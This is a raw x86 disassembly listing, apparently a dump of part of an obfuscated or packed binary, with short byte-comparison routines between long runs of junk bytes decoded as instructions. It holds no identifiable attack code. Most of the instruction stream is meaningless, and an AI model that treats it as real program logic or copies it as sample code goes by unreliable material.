  408044:	pusha  
  408045:	aas    
  408046:	sub    edx,esi
  408048:	adc    al,0x2a
  40804a:	pop    esi
  40804b:	or     eax,0xd4c454e2
  408050:	jbe    0x408093
  408052:	test   BYTE PTR [ebx],dl
  408054:	(bad)  
  408055:	xchg   edx,eax
  408056:	sbb    BYTE PTR [ecx-0x5b],bl
  408059:	lea    ecx,[edi]
  40805b:	sub    al,0x7c
  40805d:	leave  
  40805e:	jns    0x40807d
  408060:	(bad)  
  408061:	mov    ebx,0xff9ce257
  408066:	cs add eax,0x76fd8615
  40806c:	daa    
  40806d:	xchg   ebp,eax
  40806e:	dec    edi
  40806f:	test   BYTE PTR [edi-0x5f2be68a],0x6c
  408076:	aam    0xed
  408078:	xchg   edi,eax
  408079:	add    cl,BYTE PTR [esp+ebp*1-0x47]
  40807d:	nop
  40807e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40807f:	imul   edi,DWORD PTR [eax+eax*8-0x7793dcb8],0x6d
  408087:	rcl    al,0x18
  40808a:	aam    0xb1
  40808c:	inc    edx
  40808d:	mov    al,0x5a
  40808f:	pop    esi
  408090:	ror    esi,cl
  408092:	gs stos DWORD PTR es:[edi],eax
  408094:	retf   0xcf04
  408097:	mov    esp,cs
  408099:	dec    edx
  40809a:	mov    dh,0xd8
  40809c:	sbb    ebx,DWORD PTR [edx+esi*8]
  40809f:	shl    DWORD PTR [ecx-0x33f0f3e6],cl
  4080a5:	dec    esp
  4080a6:	je     0x408028
  4080a8:	lock out 0xc4,eax
  4080ab:	into   
  4080ac:	inc    edx
  4080ad:	xchg   ecx,eax
  4080ae:	push   ss
  4080af:	jb     0x40810a
  4080b1:	lea    esp,ds:0xbb05aa1
  4080b7:	mov    al,ds:0x67eb2f65
  4080bc:	nop
  4080bd:	jne    0x408064
  4080bf:	hlt    
  4080c0:	test   BYTE PTR [eax+0x4a4974ba],cl
  4080c6:	pop    ds
  4080c7:	aad    0xa8
  4080c9:	sub    eax,0xe55adc48
  4080ce:	adc    al,BYTE PTR [esi+0x3c1332f]
  4080d4:	(bad)  
  4080d5:	mov    DWORD PTR [edx],eax
  4080d7:	mov    eax,DWORD PTR [ebp-0x8]
  4080da:	xor    eax,ecx
  4080dc:	add    eax,esi
  4080de:	mov    DWORD PTR [ebp+0x8],eax
  4080e1:	mov    eax,DWORD PTR [ebp+0x8]
  4080e4:	jmp    0x4083ed
  4080e9:	ret    
  4080ea:	ror    ch,1
  4080ec:	rcr    ecx,0xc9
  4080ef:	rcl    esi,cl
  4080f1:	push   edx
  4080f2:	add    DWORD PTR [edx+0x3497a275],eax
  4080f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4080f9:	hlt    
  4080fa:	fnstsw WORD PTR [eax+0x78]
  4080fd:	fs jle 0x408178
  408100:	js     0x408151
  408102:	jmp    0x4080da
  408104:	jmp    0x339cd2a4
  408109:	popf   
  40810a:	jg     0x408143
  40810c:	push   0xfcdcf91a
  408111:	pop    esp
  408112:	loop   0x4080b4
  408114:	push   cs
  408115:	or     eax,edi
  408117:	icebp  
  408118:	scas   eax,DWORD PTR es:[edi]
  408119:	add    cl,bh
  40811b:	adc    eax,0xef5fdb14
  408120:	or     ch,BYTE PTR [edi]
  408122:	mov    esp,0x852aedf0
  408127:	jb     0x4080c0
  408129:	mov    al,0xd
  40812b:	add    al,0xda
  40812d:	adc    DWORD PTR [esi+0x46],0xf
  408131:	test   eax,0x6ec5e65e
  408136:	push   eax
  408137:	jl     0x408192
  408139:	je     0x40816f
  40813b:	and    DWORD PTR [ebp-0x4c8088c5],edx
  408141:	dec    ebx
  408142:	sbb    eax,0x5ce12227
  408147:	push   eax
  408148:	sub    eax,0x336d213
  40814d:	mov    ebx,0xa21c5c1b
  408152:	leave  
  408153:	inc    esp
  408154:	scas   eax,DWORD PTR es:[edi]
  408155:	adc    eax,DWORD PTR [edx]
  408157:	push   ebx
  408158:	or     eax,0xffffffea
  40815b:	push   esp
  40815c:	aas    
  40815d:	xchg   edi,eax
  40815e:	push   edi
  40815f:	iret   
  408160:	aad    0x19
  408162:	sbb    eax,0xdf869f72
  408167:	dec    BYTE PTR [eax]
  408169:	and    DWORD PTR [ebx-0x72b0c590],ebp
  40816f:	rol    dl,0xd6
  408172:	stc    
  408173:	cmp    al,0xf0
  408175:	fisubr WORD PTR [ecx]
  408177:	test   DWORD PTR [edx+0x6489e4cf],ebp
  40817d:	leave  
  40817e:	jne    0x408171
  408180:	or     BYTE PTR [eax+esi*4+0x7f],cl
  408184:	cmp    ecx,ebx
  408186:	fstp   DWORD PTR [edi-0x2378e242]
  40818c:	fimul  DWORD PTR [ecx]
  40818e:	inc    eax
  40818f:	int    0x87
  408191:	adc    al,BYTE PTR [esi+0x645a80ff]
  408197:	xchg   esi,eax
  408198:	(bad)  
  408199:	mov    eax,0xc5492584
  40819e:	cwde   
  40819f:	sbb    eax,0xc81a45b6
  4081a4:	mov    ebp,0xbf6cc360
  4081a9:	ss jae 0x408199
  4081ac:	fcomp  DWORD PTR [ebx-0x44]
  4081af:	out    0x8f,al
  4081b1:	popa   
  4081b2:	or     BYTE PTR [edx*1-0x2ffeacb4],0x87
  4081ba:	imul   ecx,ebp,0x6238ef6e
  4081c0:	imul   esp,DWORD PTR [edi],0x69
  4081c3:	stos   BYTE PTR es:[edi],al
  4081c4:	dec    ebp
  4081c5:	jl     0x40822b
  4081c7:	mov    dh,0xf7
  4081c9:	mov    edi,eax
  4081cb:	mov    ds:0xd8026f6b,al
  4081d0:	stos   DWORD PTR es:[edi],eax
  4081d1:	cld    
  4081d2:	push   ss
  4081d3:	aam    0x79
  4081d5:	jl     0x4081e3
  4081d7:	ds das 
  4081d9:	out    dx,eax
  4081da:	jmp    0x3a6c:0x7aa07551
  4081e1:	adc    eax,0xf91898b4
  4081e6:	dec    esp
  4081e7:	gs shl edi,1
  4081ea:	adc    bl,BYTE PTR ds:0x2453e352
  4081f0:	(bad)  
  4081f1:	pop    edi
  4081f2:	(bad)  
  4081f5:	sub    dh,BYTE PTR [edi-0x1f]
  4081f8:	dec    edx
  4081f9:	jl     0x408208
  4081fb:	mov    cl,0xf1
  4081fd:	in     eax,0x32
  4081ff:	mov    esi,gs
  408201:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408202:	sbb    eax,0x6aa44237
  408207:	fisttp QWORD PTR [edx+0x207624f0]
  40820d:	(bad)  [edi-0x6b]
  408210:	sbb    dh,0x75
  408213:	outs   dx,DWORD PTR ds:[esi]
  408214:	jp     0x40824e
  408216:	mov    ds:0xd067bfc6,al
  40821b:	add    ebp,DWORD PTR [ebx]
  40821d:	or     edi,ebp
  40821f:	mov    ch,0x52
  408221:	shl    DWORD PTR [eax+0x2c],1
  408224:	sub    al,0x99
  408226:	ret    
  408227:	lds    esi,FWORD PTR [edx]
  408229:	lahf   
  40822a:	ds (bad) 
  40822c:	(bad)  
  40822d:	sbb    al,ch
  40822f:	xor    al,0xa8
  408231:	dec    eax
  408232:	ror    BYTE PTR ds:0xe3ad1b18,cl
  408238:	and    DWORD PTR [esi-0x8],eax
  40823b:	add    BYTE PTR [ebx-0x30390b22],al
  408241:	jae    0x40829e
  408243:	inc    eax
  408244:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408245:	and    eax,0x53d7bdb3
  40824a:	cmp    edx,ecx
  40824c:	add    ebp,esp
  40824e:	mov    edx,0x22dffa46
  408253:	adc    al,0x3b
  408255:	int    0xe5
  408257:	mov    eax,0x8ea7cbed
  40825c:	dec    ebp
  40825d:	mov    al,ds:0xf7770b4c
  408262:	fwait
  408263:	sub    DWORD PTR [ebx],eax
  408265:	or     eax,0x241e1d2b
  40826a:	loopne 0x4082bb
  40826c:	loop   0x40824c
  40826e:	add    DWORD PTR [esi],esi
  408270:	fiadd  DWORD PTR [edi-0x1f]
  408273:	out    0xfd,eax
  408275:	sub    BYTE PTR [ebx],dl
  408277:	repnz add DWORD PTR [ebx],esp
  40827a:	ins    BYTE PTR es:[edi],dx
  40827b:	jmp    0xb65b:0xd07df148
  408282:	add    eax,0x6db27407
  408287:	fidivr WORD PTR ds:0x68d01fb7
  40828d:	enter  0x74ef,0xb4
  408291:	ja     0x408285
  408293:	(bad)  [ebp-0x407c56e7]
  408299:	push   ss
  40829a:	add    al,0x8
  40829c:	mov    ebp,0x8f8f0e28
  4082a1:	jns    0x40829d
  4082a3:	in     al,dx
  4082a4:	cmc    
  4082a5:	lea    ecx,[ebx+0x6638feb8]
  4082ab:	out    dx,eax
  4082ac:	xor    bh,BYTE PTR [eax+0x21813dbf]
  4082b2:	xor    eax,0x2fe51953
  4082b7:	shl    ah,1
  4082b9:	fstp   DWORD PTR [edi]
  4082bb:	dec    esi
  4082bc:	sub    eax,0xf3fcc4e9
  4082c1:	jbe    0x40828e
  4082c3:	clc    
  4082c4:	push   esi
  4082c5:	and    BYTE PTR [esi-0x1a],bl
  4082c8:	xchg   BYTE PTR ds:0x97045013,bh
  4082ce:	loopne 0x40829c
  4082d0:	int    0x94
  4082d2:	in     al,dx
  4082d3:	xor    esi,DWORD PTR [eax]
  4082d5:	in     al,0x41
  4082d7:	mov    DWORD PTR [ebx+0x593eef8b],ebp
  4082dd:	sbb    eax,0x8edab569
  4082e2:	test   DWORD PTR [esi+0x4c],edi
  4082e5:	mov    ecx,0x5462773
  4082ea:	call   0x589a169e
  4082ef:	cli    
  4082f0:	push   ecx
  4082f1:	fisttp DWORD PTR [esi-0x23938d0b]
  4082f7:	das    
  4082f8:	lahf   
  4082f9:	mov    edx,0x76471712
  4082fe:	scas   al,BYTE PTR es:[edi]
  4082ff:	sbb    dl,dh
  408301:	or     al,0x5b
  408303:	dec    ebx
  408304:	fwait
  408305:	daa    
  408306:	fcom   QWORD PTR [eax-0x117e1364]
  40830c:	xchg   ebp,eax
  40830d:	out    0xb5,al
  40830f:	dec    ebp
  408310:	jb     0x4082b9
  408312:	cmp    ebx,DWORD PTR [edx+eiz*4-0x16dc1d13]
  408319:	cli    
  40831a:	clc    
  40831b:	adc    BYTE PTR [ebp-0x2b],cl
  40831e:	cmp    BYTE PTR [ebx+0x67cc78dd],0x1a
  408325:	(bad)  
  408326:	sbb    BYTE PTR [edx+0x11],dl
  408329:	mov    al,0xcc
  40832b:	sub    DWORD PTR [edx-0x79],edx
  40832e:	call   DWORD PTR [ebx+0x76de8733]
  408334:	ja     0x408386
  408336:	(bad)  [ecx]
  408338:	in     eax,dx
  408339:	clc    
  40833a:	mov    ah,0xee
  40833d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40833e:	adc    esp,edx
  408340:	jns    0x408397
  408342:	arpl   WORD PTR [edx+0x3a],dx
  408345:	mov    cl,0x68
  408347:	xchg   ebp,eax
  408348:	push   cs
  408349:	jne    0x4082d7
  40834b:	jo     0x4082e4
  40834d:	sahf   
  40834e:	shr    DWORD PTR [ebp+0x1ac704fe],1
  408354:	ret    0xa6c5
  408357:	ficomp DWORD PTR [ecx]
  408359:	cmp    eax,0xcf041a2e
  40835e:	jl     0x4082f4
  408360:	push   edi
  408361:	pop    es
  408362:	iret   
  408363:	mov    eax,0x1a403e4
  408368:	pop    edx
  408369:	nop
  40836a:	jb     0x4083c1
  40836c:	ret    0xa23e
  40836f:	gs pushaw 
  408372:	and    DWORD PTR [esi+ecx*4-0x19],ecx
  408376:	out    dx,eax
  408377:	cmp    DWORD PTR [edi+ebx*2],0x25
  40837b:	jg     0x408300
  40837d:	test   BYTE PTR [esi+0x7b],bh
  408380:	sbb    al,bl
  408382:	mov    edi,DWORD PTR [edx]
  408384:	mov    dh,BYTE PTR [edx-0x4f]
  408387:	and    BYTE PTR [edx],dh
  408389:	dec    ecx
  40838a:	xor    ebx,ecx
  40838c:	je     0x408347
  40838e:	icebp  
  40838f:	xchg   edi,eax
  408390:	test   eax,0x6185ea13
  408395:	pop    edx
  408396:	pop    ebp
  408397:	ret    
  408398:	xchg   bh,ah
  40839a:	sub    al,BYTE PTR [ebx-0x3e893015]
  4083a0:	cmp    edx,DWORD PTR ds:0xaaa6a772
  4083a6:	(bad)  
  4083a7:	(bad)  
  4083a9:	aam    0xc0
  4083ab:	pop    ebx
  4083ac:	adc    ah,BYTE PTR [eax+edx*1]
  4083af:	data16 cmp al,0xf4
  4083b2:	jmp    0xfcde01fa
  4083b7:	repz mov dh,0x8b
  4083ba:	jo     0x40838d
  4083bc:	pusha  
  4083bd:	jmp    0x408365
  4083bf:	jp     0x408360
  4083c1:	dec    esi
  4083c2:	fild   WORD PTR [edx-0x45da8d00]
  4083c8:	in     al,0x99
  4083ca:	or     DWORD PTR [esi+eax*1+0x74b5521b],ebx
  4083d1:	jecxz  0x40838f
  4083d3:	cmc    
  4083d4:	vmread DWORD PTR [edx+0x29],edx
  4083d8:	dec    ebp
  4083d9:	push   esp
  4083da:	and    eax,0xfa9e5016
  4083df:	inc    edi
  4083e0:	mov    bl,0x31
  4083e2:	repnz popw ds
  4083e5:	push   es
  4083e6:	ret    0x59e1
  4083e9:	mov    ch,0xab
  4083eb:	int3   
  4083ec:	dec    ebx
  4083ed:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4083f1:	mov    dl,BYTE PTR [ebp-0x1]
  4083f4:	cmp    al,dl
  4083f6:	je     0x408742
  4083fc:	mov    eax,DWORD PTR [ebp+0x8]
  4083ff:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  408403:	mov    edx,DWORD PTR [ebp+0xc]
  408406:	cmp    al,BYTE PTR [edx]
  408408:	jne    0x408a71
  40840e:	mov    eax,DWORD PTR [ebp-0x8]
  408411:	mov    edx,DWORD PTR [ebp+0xc]
  408414:	movsx  edx,BYTE PTR [edx]
  408417:	xor    eax,ecx
  408419:	add    eax,esi
  40841b:	cmp    edx,eax
  40841d:	je     0x40875c
  408423:	mov    DWORD PTR [ebp-0x18],0x705fd8e
  40842a:	jmp    0x408733
  40842f:	cmp    al,0xc8
  408431:	rcl    dl,0xd4
  408434:	fcmovu st,st(2)
  408436:	into   
  408437:	(bad)  
  408438:	leave  
  408439:	xchg   BYTE PTR [edi+0xc72a8a0],dl
  40843f:	loopne 0x408423
  408441:	js     0x4084bb
  408443:	fs jle 0x4084be
  408446:	js     0x40848e
  408448:	or     ecx,DWORD PTR [ecx+0x5302751b]
  40844e:	inc    edi
  40844f:	pop    edx
  408450:	jno    0x408494
  408452:	jg     0x40848d
  408454:	sar    eax,1
  408456:	and    DWORD PTR [ebp+eiz*8+0x31e6f6ab],eax
  40845d:	outs   dx,DWORD PTR ds:[esi]
  40845e:	scas   eax,DWORD PTR es:[edi]
  40845f:	or     eax,0x25ceca91
  408464:	inc    ecx
  408465:	fld    TBYTE PTR [esp+esi*1]
  408468:	mov    eax,ds:0xf74f88f1
  40846d:	jae    0x408417
  40846f:	scas   eax,DWORD PTR es:[edi]
  408470:	sti    
  408471:	mov    esp,0x3aa46e0
  408476:	pop    esi
  408477:	xchg   bl,bl
  408479:	mov    dl,0xca
  40847b:	out    0x41,al
  40847d:	pop    ds
  40847e:	xchg   DWORD PTR [esi],ebp
  408480:	cwde   
  408481:	push   0xffffffcb
  408483:	test   DWORD PTR [ebx+0x1ca832f4],esi
  408489:	jo     0x408486
  40848b:	test   eax,0x446569a4
  408490:	call   0x2ebd:0x50bba077
  408497:	mov    ecx,DWORD PTR [edx+0x5c]
  40849a:	repnz xor bl,ah
  40849d:	sbb    DWORD PTR [ecx-0x28],edx
  4084a0:	and    al,0x89
  4084a2:	sub    bl,bl
  4084a4:	jp     0x408435
  4084a6:	jmp    0xc5dc:0x1e574711
  4084ad:	add    al,BYTE PTR [eax+0x73]
  4084b0:	push   0xffffff95
  4084b2:	popa   
  4084b3:	ins    BYTE PTR es:[edi],dx
  4084b4:	adc    esp,DWORD PTR [edx+edx*2]
  4084b7:	pop    es
  4084b8:	mov    ecx,0xd2bc1caf
  4084bd:	xchg   ecx,eax
  4084be:	shl    DWORD PTR [eax],cl
  4084c0:	data16 mov WORD PTR [eax+0xfe5a7bf],fs
  4084c7:	test   dl,0x8e
  4084ca:	mov    bl,BYTE PTR [ecx-0x57e40f93]
  4084d0:	int3   
  4084d1:	out    dx,al
  4084d2:	shl    edx,cl
  4084d4:	cwde   
  4084d5:	sbb    cl,dl
  4084d7:	sbb    al,0x28
  4084d9:	scas   al,BYTE PTR es:[edi]
  4084da:	mov    ch,0x41
  4084dc:	mov    edx,cs
  4084de:	pop    esi
  4084df:	in     eax,dx
  4084e0:	mov    ds:0x9c9c5868,al
  4084e5:	in     al,dx
  4084e6:	sub    DWORD PTR [edi],edi
  4084e8:	xchg   esi,eax
  4084e9:	inc    esp
  4084ea:	pop    esp
  4084eb:	ret    0xe129
  4084ee:	retf   
  4084ef:	fscale 
  4084f1:	jecxz  0x40848d
  4084f3:	or     DWORD PTR [ebp+0x4a],eax
  4084f6:	jl     0x40856b
  4084f8:	cmp    DWORD PTR [edi],ebp
  4084fa:	fs loopne 0x408514
  4084fd:	fstp   DWORD PTR [ebx-0x36]
  408500:	adc    eax,0x575b66f
  408505:	inc    edx
  408506:	jle    0x4084d8
  408508:	mov    cl,BYTE PTR [esi+ebx*8-0x67]
  40850c:	inc    eax
  40850d:	pusha  
  40850e:	dec    dl
  408510:	add    DWORD PTR [edx-0x7a9085e0],ebp
  408516:	add    BYTE PTR [ecx+0x75f90145],dh
  40851c:	xlat   BYTE PTR ds:[ebx]
  40851d:	push   esp
  40851e:	nop
  40851f:	fimul  DWORD PTR [ebx-0x76fa72f9]
  408525:	push   ebx
  408526:	xchg   ecx,eax
  408527:	int3   
  408528:	aaa    
  408529:	aam    0x78
  40852b:	push   edi
  40852c:	outs   dx,BYTE PTR ds:[esi]
  40852d:	cmp    ah,BYTE PTR [ecx-0x12]
  408530:	(bad)  
  408532:	scas   al,BYTE PTR es:[edi]
  408533:	push   cs
  408534:	pop    ds
  408535:	mov    ebx,0x7b83bb1b
  40853a:	cmp    al,0xda
  40853c:	jg     0x408585
  40853e:	inc    ecx
  40853f:	xchg   edi,eax
  408540:	dec    esp
  408541:	scas   eax,DWORD PTR es:[edi]
  408542:	mov    ebx,0x18b67cac
  408547:	cdq    
  408548:	ins    DWORD PTR es:[edi],dx
  408549:	loopne 0x408549
  40854b:	xchg   edi,eax
  40854c:	je     0x4085bc
  40854e:	ins    BYTE PTR es:[edi],dx
  40854f:	ins    DWORD PTR es:[edi],dx
  408550:	adc    DWORD PTR [eax],esi
  408552:	arpl   WORD PTR [esi-0x3547ae0c],bp
  408558:	xor    al,0x88
  40855a:	xchg   DWORD PTR [eax-0x11907341],esi
  408560:	jns    0x408578
  408562:	cli    
  408563:	lds    edi,FWORD PTR [edi-0x11f02e73]
  408569:	popa   
  40856a:	mov    bl,0x3b
  40856c:	gs ins DWORD PTR es:[edi],dx
  40856e:	mov    ds:0xaef44926,al
  408573:	(bad)  
  408574:	loope  0x408581
  408576:	ret    
  408577:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408578:	push   0x31
  40857a:	mov    ecx,0x419a948e
  40857f:	jle    0x408569
  408581:	test   eax,0x21016bf
  408586:	xor    DWORD PTR [esi-0x3ad6ac00],edi
  40858c:	(bad)  
  40858d:	mov    edx,0x6f4971a7
  408592:	adc    dh,ch
  408594:	frstor [edi+esi*1]
  408597:	sub    DWORD PTR [esi-0x586f5cf1],ebp
  40859d:	sbb    eax,0x46494dbf
  4085a2:	jae    0x4085f0
  4085a4:	mov    dh,0xc0
  4085a6:	loopne 0x408529
  4085a8:	les    ebx,FWORD PTR [edi]
  4085aa:	xor    edx,edi
  4085ac:	(bad)  
  4085ad:	lock push ebx
  4085af:	scas   al,BYTE PTR es:[edi]
  4085b0:	mov    ecx,0xb9fa3698
  4085b5:	pop    esi
  4085b6:	ins    DWORD PTR es:[edi],dx
  4085b7:	es pusha 
  4085b9:	shr    eax,cl
  4085bb:	loop   0x4085bd
  4085bd:	mov    al,ds:0xdf6e83ef
  4085c2:	int3   
  4085c3:	xor    ebp,DWORD PTR [ebp-0xd]
  4085c6:	out    0x35,eax
  4085c8:	and    edx,eax
  4085ca:	cmp    BYTE PTR [edx-0x2ec4e27e],dh
  4085d0:	mov    ebp,0xff28afb1
  4085d5:	mov    WORD PTR [ebx-0x1d5e4b3f],ss
  4085db:	sti    
  4085dc:	cmp    ah,BYTE PTR [ebx-0x20279753]
  4085e2:	mov    edi,0xb9ab59ef
  4085e7:	jno    0x4085c7
  4085e9:	popa   
  4085ea:	inc    edx
  4085eb:	jl     0x40858a
  4085ed:	outs   dx,BYTE PTR ds:[esi]
  4085ee:	dec    ecx
  4085ef:	daa    
  4085f0:	ret    
  4085f1:	pop    ecx
  4085f2:	sbb    ecx,esi
  4085f4:	out    0x8f,eax
  4085f6:	(bad)  
  4085f7:	xor    ah,BYTE PTR [ecx+0x7f]
  4085fa:	sahf   
  4085fb:	inc    edx
  4085fc:	cmp    dl,BYTE PTR ss:[edi-0x40]
  408600:	mov    ebp,0x6cbe664f
  408605:	push   es
  408606:	cld    
  408607:	sbb    al,0x15
  408609:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40860a:	ss dec ecx
  40860c:	or     BYTE PTR [esi-0x52647e62],ah
  408612:	xor    BYTE PTR [esi+0x7d8fc9a3],ch
  408618:	mov    ah,0x6e
  40861a:	jnp    0x4085a1
  40861c:	(bad)  
  40861d:	frstor [ebx]
  40861f:	sub    eax,0x3a18e070
  408624:	fs jmp 0x40867f
  408627:	xchg   ebx,eax
  408628:	cdq    
  408629:	je     0x408643
  40862b:	lods   eax,DWORD PTR ds:[esi]
  40862c:	cli    
  40862d:	mov    BYTE PTR es:[esi],ah
  408630:	jg     0x408661
  408632:	bswap  ebp
  408634:	mov    ds:0x4482ba9d,al
  408639:	xchg   edx,eax
  40863a:	icebp  
  40863b:	outs   dx,DWORD PTR ds:[esi]
  40863c:	aad    0x5e
  40863e:	int3   
  40863f:	inc    edx
  408640:	cwde   
  408641:	sub    al,0x3f
  408643:	cmc    
  408644:	or     BYTE PTR [ebp-0x3de9244e],ah
  40864a:	(bad)  
  40864b:	mov    ds:0x6b6c1285,al
  408650:	xor    DWORD PTR [edi-0x1d],edi
  408653:	dec    ebp
  408654:	or     esi,esi
  408656:	fisttp WORD PTR [ebp+0x5592b137]
  40865c:	je     0x40867d
  40865e:	iret   
  40865f:	mov    ecx,eax
  408661:	lods   al,BYTE PTR ds:[esi]
  408662:	popf   
  408663:	dec    dx
  408665:	inc    eax
  408666:	out    0x1b,al
  408668:	les    ebp,FWORD PTR [eax-0x74]
  40866b:	mov    BYTE PTR [esi+0x713289f8],cl
  408671:	xor    BYTE PTR [esi],bl
  408673:	sub    DWORD PTR [edi+esi*2+0x19dbb3c4],esp
  40867a:	pmaxsw mm1,mm0
  40867d:	pop    edi
  40867e:	mov    al,0xaa
  408680:	dec    ecx
  408681:	call   0x586e:0xcdbf251e
  408688:	retf   0xa3fc
  40868b:	jns    0x40868e
  40868d:	push   0x135ced3
  408692:	or     BYTE PTR [edi-0x201a7dcd],0xfb
  408699:	popa   
  40869a:	addr16 dec ecx
  40869c:	xchg   edi,eax
  40869d:	sbb    esp,DWORD PTR [ebp+0x14]
  4086a0:	hlt    
  4086a1:	rcl    DWORD PTR [edi-0x25b5f38d],cl
  4086a7:	das    
  4086a8:	imul   ecx,DWORD PTR [ebx+0x69ba65e],0x5f
  4086af:	fwait
  4086b0:	xchg   ebp,eax
  4086b1:	cmc    
  4086b2:	mov    al,ds:0x1ec1022f
  4086b7:	test   DWORD PTR [esi],esi
  4086b9:	inc    ecx
  4086ba:	inc    esi
  4086bb:	dec    ecx
  4086bc:	std    
  4086bd:	jecxz  0x408676
  4086bf:	aam    0x4
  4086c1:	push   edx
  4086c2:	fstp   QWORD PTR [edi+0x4280048e]
  4086c8:	daa    
  4086c9:	outs   dx,DWORD PTR ds:[esi]
  4086ca:	or     edi,DWORD PTR [ebp+0x3d869ed]
  4086d0:	jae    0x408677
  4086d2:	lds    eax,FWORD PTR [ebx]
  4086d4:	adc    eax,DWORD PTR [ecx+0x20]
  4086d7:	aaa    
  4086d8:	popa   
  4086d9:	int    0x7
  4086db:	(bad)  
  4086dc:	lock cwde 
  4086de:	sahf   
  4086df:	test   eax,0xfdda7938
  4086e4:	push   edx
  4086e5:	rcl    BYTE PTR [edi+0x1b09ad8c],cl
  4086eb:	mov    bl,0xdb
  4086ed:	jl     0x4086b9
  4086ef:	fild   DWORD PTR [eax]
  4086f1:	inc    edi
  4086f2:	pop    edi
  4086f3:	mov    ecx,0x4a044e7
  4086f8:	pop    ds
  4086f9:	lods   eax,DWORD PTR ds:[esi]
  4086fa:	fs and al,0xfe
  4086fd:	push   eax
  4086fe:	jbe    0x40871a
  408700:	retf   0x7ee2
  408703:	inc    ebx
  408704:	push   ss
  408705:	jbe    0x4086da
  408707:	push   ss
  408708:	jno    0x408720
  40870a:	pop    ss
  40870b:	out    0x9d,al
  40870d:	push   edx
  40870e:	inc    eax
  40870f:	inc    ecx
  408710:	je     0x408731
  408712:	neg    BYTE PTR [edi-0x253637f1]
  408718:	and    ebx,DWORD PTR [edx+ebp*4]
  40871b:	neg    BYTE PTR ss:[eax+0x5f68d756]
  408722:	ja     0x4086e1
  408724:	inc    esp
  408725:	js     0x4086f6
  408727:	idiv   BYTE PTR [edi]
  408729:	and    dl,BYTE PTR [edi-0x4]
  40872c:	cmp    DWORD PTR [esi+0x12],edi
  40872f:	jmp    0xe845:0x8d55172d
  408736:	mov    DWORD PTR [ebp-0x14],eax
  408739:	mov    eax,DWORD PTR [ebp-0x14]
  40873c:	add    DWORD PTR [eax],0x705fa8e
  408742:	mov    eax,DWORD PTR [ebp-0x10]
  408745:	mov    edx,DWORD PTR [ebp+0x8]
  408748:	xor    eax,ecx
  40874a:	lea    eax,[eax+edx*1+0x327298]
  408751:	mov    DWORD PTR [ebp+0x8],eax
  408754:	inc    DWORD PTR [ebp+0xc]
  408757:	jmp    0x4080e1
  40875c:	mov    eax,DWORD PTR [ebp-0x10]
  40875f:	xor    eax,ecx
  408761:	mov    ecx,DWORD PTR [ebp+0x10]
  408764:	add    eax,esi
  408766:	jmp    0x408a6f
  40876b:	(bad)
  40876e:	aas    
  40876f:	fld    st(3)
  408771:	(bad)  
  408773:	add    edi,DWORD PTR [ebp-0x7e]
  408776:	sahf   
  408777:	inc    edi
  408778:	jae    0x40870d
  40877a:	aam    0xcc
  40877c:	out    0x78,eax
  40877e:	js     0x4087e4
  408780:	jle    0x4087fa
  408782:	js     0x408728
  408784:	sbb    BYTE PTR [ecx+0x5c907872],ah
  40878a:	in     eax,0x4c
  40878c:	xchg   dh,cl
  40878e:	lea    esp,[ebp+0x1]
  408791:	pop    ebx
  408792:	jmp    0xaedc7f7c
  408797:	push   ds
  408798:	jg     0x40872f
  40879a:	cmp    al,0xf9
  40879c:	xor    esi,DWORD PTR [esi]
  40879e:	dec    ebp
  40879f:	loope  0x408779
  4087a1:	pop    es
  4087a2:	daa    
  4087a3:	retf   
  4087a4:	mov    ch,0xdd
  4087a6:	push   edx
  4087a7:	sti    
  4087a8:	mov    eax,0xc834ac5f
  4087ad:	push   esp
  4087ae:	inc    esi
  4087af:	xlat   BYTE PTR ds:[ebx]
  4087b0:	lahf   
  4087b1:	sub    ecx,DWORD PTR [edx-0x57cae412]
  4087b7:	je     0x4087dc
  4087b9:	and    eax,0xd4a76033
  4087be:	cmp    edx,ebp
  4087c0:	inc    ebp
  4087c1:	(bad)  
  4087c2:	and    edx,esi
  4087c4:	adc    al,0x5
  4087c6:	fcomip st,st(1)
  4087c8:	cs aad 0xbd
  4087cb:	rcl    DWORD PTR [esi],1
  4087cd:	mov    bh,0x77
  4087cf:	cmp    ecx,ebx
  4087d1:	or     DWORD PTR [edx+0x1b],edx
  4087d4:	mov    esp,DWORD PTR [ebp-0x80]
  4087d7:	mov    edi,0xd7e44b9b
  4087dc:	jno    0x4087ef
  4087de:	dec    esi
  4087df:	dec    esp
  4087e0:	in     al,0x85
  4087e2:	repnz enter 0xf69c,0x43
  4087e7:	(bad)  
  4087e8:	cmp    bh,BYTE PTR [ebx+0x1c26078e]
  4087ee:	pop    ss
  4087ef:	rol    DWORD PTR [esi-0x25],cl
  4087f2:	and    esp,DWORD PTR [edx]
  4087f4:	iret   
  4087f5:	loopne 0x408876
  4087f7:	cmp    DWORD PTR [esi-0x11f33a21],esi
  4087fd:	sub    esi,DWORD PTR ds:0x739d6a67
  408803:	cmp    dh,BYTE PTR [ebx]
  408805:	mov    ebp,0xcd63491b
  40880a:	dec    ecx
  40880b:	pop    eax
  40880c:	aaa    
  40880d:	in     al,0xbf
  40880f:	or     eax,0xf4a05118
  408814:	xchg   esi,eax
  408815:	push   0x2f418bac
  40881a:	sahf   
  40881b:	icebp  
  40881c:	jns    0x40888b
  40881e:	inc    edx
  40881f:	pop    eax
  408820:	pushf  
  408821:	mul    DWORD PTR [eax-0x12]
  408824:	shl    DWORD PTR [ecx+0x2d],1
  408827:	out    0xbc,eax
  408829:	pusha  
  40882a:	das    
  40882b:	jl     0x408890
  40882d:	cwde   
  40882e:	out    dx,eax
  40882f:	pop    es
  408830:	std    
  408831:	and    al,0x10
  408833:	stos   DWORD PTR es:[edi],eax
  408834:	nop
  408835:	sub    DWORD PTR [edx-0x1e],0x51
  408839:	retf   0x38e7
  40883c:	dec    edx
  40883d:	sbb    ah,BYTE PTR [ecx-0x73]
  408840:	push   edx
  408841:	jecxz  0x408809
  408843:	loope  0x4087e9
  408845:	mov    ecx,0x8b25a801
  40884a:	push   es
  40884b:	shl    DWORD PTR ss:[ebx-0x7d],1
  40884f:	sbb    BYTE PTR [edx],bh
  408851:	call   0xd9435dfa
